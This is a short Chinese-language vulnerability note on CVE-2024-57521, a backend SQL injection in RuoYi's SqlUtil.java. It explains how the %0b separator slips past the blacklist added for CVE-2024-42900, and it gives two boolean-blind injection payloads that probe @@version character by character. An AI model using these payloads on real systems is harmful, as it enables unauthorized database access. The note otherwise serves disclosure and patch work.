CVE-2024-57521 后台sql注入

还是上面的/ruoyi-common/src/main/java/com/ruoyi/common/utils/sql/SqlUtil.java

在本例中，为了修复 CVE-2024-42900，黑名单中加入了 /* 字符串

但应用程序仍未拦截 %0b 字符，因此可以使用 select%0b 触发 SQL 注入。 其中 select 的匹配规则实际上匹配的是 select （后面带一个空格）。它无法匹配 select%0b，而 %0b 在 SQL 中是有效的分隔符。

布尔盲注

a. 注入 TRUE 查询：

payload:CREATE table j2iz96_663 as SELECT%0b111 FROM sys_job WHERE 1=0 AND%0bIF(ascii(substring((select%0b@@version),18,1))=45, 1, 1/0);

b. 注入 FALSE 查询：

sql=CREATE table j2iz96_665 as SELECT111 FROM sys_job WHERE 1=0 ANDIF(ascii(substring((select@@version),5,1))=44, 1, 1/0);
